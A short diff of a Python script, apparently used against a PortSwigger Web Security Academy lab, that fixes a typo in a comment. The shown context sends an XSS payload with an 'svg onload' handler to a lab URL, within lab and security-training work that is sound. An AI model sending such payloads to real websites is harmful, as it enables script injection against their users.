@@ -20,6 +20,6 @@ def send_exploit(url, payload):
         print(f"[-] Ошибка при выполнении запроса: {e}")
 
 if __name__ == "__main__":
-    target_url = "https://LAB-ID.web-security-academy.net/" #chage_this
+    target_url = "https://LAB-ID.web-security-academy.net/" #change_this
     xss_payload = "{{ \"><svg onload=alert(1)> }}"
     send_exploit(target_url, xss_payload)
